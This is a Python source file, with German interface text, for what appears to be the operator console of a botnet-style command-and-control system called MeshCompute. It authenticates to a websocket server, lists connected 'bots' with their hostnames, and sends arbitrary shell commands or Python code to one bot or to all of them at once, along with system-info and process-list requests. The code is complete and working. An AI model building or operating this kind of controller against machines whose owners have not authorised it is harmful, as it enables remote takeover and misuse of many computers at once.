import asyncio
import websockets
import json
import time
import logging
from colorama import init, Fore, Style
from dotenv import load_dotenv
from common.config import SERVER_URL, AUTH_TOKEN

load_dotenv()
init(autoreset=True)

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

INTRO = f"""{Fore.CYAN}
=====================================
      MeshCompute Controller v2 (Redis)
=====================================
Befehle: list | exec <bot|all> <cmd> | sysinfo <bot|all>
         python <bot|all> <code> | ps <bot|all> | ping <bot|all> | exit
====================================={Style.RESET_ALL}
"""
PROMPT = f"\n{Fore.GREEN}meshctrl > {Style.RESET_ALL}"


class MeshController:
    def __init__(self):
        self.ws = None
        self.connected = False
        self.task_counter = 0

    def next_task_id(self) -> str:
        self.task_counter += 1
        return str(self.task_counter)

    async def connect(self):
        try:
            self.ws = await websockets.connect(SERVER_URL)
            await self.ws.send(json.dumps({
                "type": "controller",
                "auth_token": AUTH_TOKEN
            }))
            self.connected = True
            print(f"{Fore.GREEN}[+] Erfolgreich mit dem Server verbunden{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[-] Verbindung fehlgeschlagen: {e}{Style.RESET_ALL}")
            self.connected = False

    async def send_command(self, command: dict, wait_result: bool = True):
        """Sendet einen Befehl und empfängt die Antwort direkt (kein Background-Task)."""
        if not self.connected:
            print(f"{Fore.RED}Nicht verbunden.{Style.RESET_ALL}")
            return
        try:
            await self.ws.send(json.dumps(command))

            # Antwort vom Server lesen (info: "Task queued" oder direkt result bei list)
            response_raw = await asyncio.wait_for(self.ws.recv(), timeout=5)
            response = json.loads(response_raw)

            # Bei list kommt das Ergebnis direkt
            if response.get("type") == "result":
                self._print_result(response)
                return

            # FIX: get_result nur für Aktionen die Tasks erzeugen (nicht für list)
            if wait_result and command.get("action") != "list":
                task_id = command.get("task_id")
                await self.ws.send(json.dumps({
                    "type": "get_result",
                    "task_id": task_id
                }))
                result_raw = await asyncio.wait_for(self.ws.recv(), timeout=35)
                result = json.loads(result_raw)
                self._print_result(result)

        except asyncio.TimeoutError:
            print(f"{Fore.RED}Timeout – keine Antwort vom Server.{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}Fehler: {e}{Style.RESET_ALL}")
            self.connected = False

    def _print_result(self, data: dict):
        """Gibt ein Ergebnis formatiert aus."""
        msg_type = data.get("type")

        if msg_type == "error":
            print(f"{Fore.RED}Fehler: {data.get('message')}{Style.RESET_ALL}")
            return

        if msg_type == "info":
            print(f"{Fore.BLUE}{data.get('message')}{Style.RESET_ALL}")
            return

        # Botliste
        if "bots" in data.get("data", {}):
            bots = data["data"]["bots"]
            print(f"\n{Fore.CYAN}=== Verbundene Bots ({data['data']['count']}) ==={Style.RESET_ALL}")
            if not bots:
                print("  (keine Bots online)")
            for bot in bots:
                color = Fore.GREEN if bot["status"] == "online" else Fore.RED
                print(f"  {color}{bot['bot_id']}{Style.RESET_ALL} | "
                      f"{bot['hostname']} | "
                      f"Zuletzt gesehen: {bot['last_seen_sec']}s")
            return

        # Task-Ergebnis
        bot_id = data.get("bot_id", "Unknown")
        print(f"\n{Fore.YELLOW}=== Ausgabe von {bot_id} ==={Style.RESET_ALL}")

        if data.get("info"):
            print(f"{Fore.CYAN}System Information:{Style.RESET_ALL}")
            for key, value in data["info"].items():
                if key != "bot_id":
                    print(f"  {key:12}: {value}")
        elif data.get("processes"):
            print(f"{Fore.CYAN}Prozesse:{Style.RESET_ALL}")
            for p in data["processes"][:20]:
                print(f"  {p['pid']:6}  {p['name'][:35]:35}  CPU: {p.get('cpu', 0):.1f}%")
        elif data.get("output") is not None:
            output = data["output"].strip()
            print(output if output else "(keine Ausgabe)")
            if data.get("error"):
                print(f"{Fore.RED}stderr: {data['error'].strip()}{Style.RESET_ALL}")
        elif data.get("success") is not None:
            if data["success"]:
                print(f"{Fore.GREEN}Erfolg: {data.get('message', 'OK')}{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}Fehler: {data.get('error', 'Unbekannt')}{Style.RESET_ALL}")
        else:
            print(json.dumps(data, indent=2, ensure_ascii=False))

    # FIX: Alle Befehle sind async und werden direkt awaitet – kein asyncio.create_task
    async def handle_command(self, line: str):
        line = line.strip()
        if not line:
            return

        parts = line.split(None, 1)
        cmd = parts[0].lower()
        arg = parts[1] if len(parts) > 1 else ""

        if cmd == "list":
            await self.send_command({
                "type": "command",
                "action": "list",
                "task_id": self.next_task_id()
            }, wait_result=False)

        elif cmd == "exec":
            parts2 = arg.split(None, 1)
            if len(parts2) < 2:
                print("Verwendung: exec <bot_id|all> <befehl>")
                return
            target, cmd_text = parts2
            await self.send_command({
                "type": "command",
                "action": "exec",
                "target": target,
                "payload": cmd_text,
                "task_id": self.next_task_id()
            })

        elif cmd == "sysinfo":
            target = arg.strip() or "all"
            await self.send_command({
                "type": "command",
                "action": "sysinfo",
                "target": target,
                "task_id": self.next_task_id()
            })

        elif cmd == "python":
            parts2 = arg.split(None, 1)
            if len(parts2) < 2:
                print("Verwendung: python <bot_id|all> <code>")
                return
            target, code = parts2
            await self.send_command({
                "type": "command",
                "action": "python",
                "target": target,
                "payload": code,
                "task_id": self.next_task_id()
            })

        elif cmd == "ps":
            target = arg.strip() or "all"
            await self.send_command({
                "type": "command",
                "action": "ps",
                "target": target,
                "task_id": self.next_task_id()
            })

        elif cmd == "ping":
            target = arg.strip() or "all"
            await self.send_command({
                "type": "command",
                "action": "ping",
                "target": target,
                "task_id": self.next_task_id()
            })

        elif cmd in ("exit", "quit"):
            print(f"{Fore.YELLOW}Controller wird beendet...{Style.RESET_ALL}")
            if self.ws:
                await self.ws.close()
            raise SystemExit

        elif cmd in ("clear", "cls"):
            print("\033c", end="")

        elif cmd == "help":
            print(f"""
{Fore.CYAN}Verfügbare Befehle:{Style.RESET_ALL}
  list                        – Alle Bots anzeigen
  exec  <bot|all> <befehl>   – Shell-Befehl ausführen
  sysinfo <bot|all>           – Systeminfo abrufen
  python  <bot|all> <code>    – Python-Code ausführen
  ps      <bot|all>           – Prozessliste
  ping    <bot|all>           – Ping
  exit                        – Beenden
""")
        else:
            print(f"{Fore.RED}Unbekannter Befehl: {cmd}. Tippe 'help' für Hilfe.{Style.RESET_ALL}")


async def main():
    print(INTRO)
    controller = MeshController()
    await controller.connect()

    if not controller.connected:
        return

    while True:
        try:
            # Input in Executor, damit asyncio nicht blockiert
            cmd_input = await asyncio.get_event_loop().run_in_executor(None, input, PROMPT)
            await controller.handle_command(cmd_input)
        except (KeyboardInterrupt, SystemExit):
            print(f"\n{Fore.YELLOW}Beendet.{Style.RESET_ALL}")
            break
        except Exception as e:
            print(f"Fehler: {e}")


if __name__ == "__main__":
    print(f"{Fore.MAGENTA}MeshCompute Controller wird gestartet...{Style.RESET_ALL}")
    asyncio.run(main())